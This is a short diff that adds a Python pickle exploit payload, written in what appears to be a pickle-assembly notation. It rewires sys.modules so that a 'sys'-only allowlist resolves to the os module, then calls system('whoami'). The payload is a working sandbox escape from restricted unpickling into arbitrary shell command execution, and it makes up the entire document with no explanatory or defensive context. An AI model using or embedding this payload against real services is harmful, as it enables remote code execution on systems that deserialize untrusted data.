@@ -1,0 +1,8 @@
+modules = GLOBAL('sys', 'modules')
+modules['sys'] = modules
+module_get = GLOBAL('sys', 'get')
+os = module_get('os')
+modules['sys'] = os
+system = GLOBAL('sys', 'system')
+system('whoami')
+return
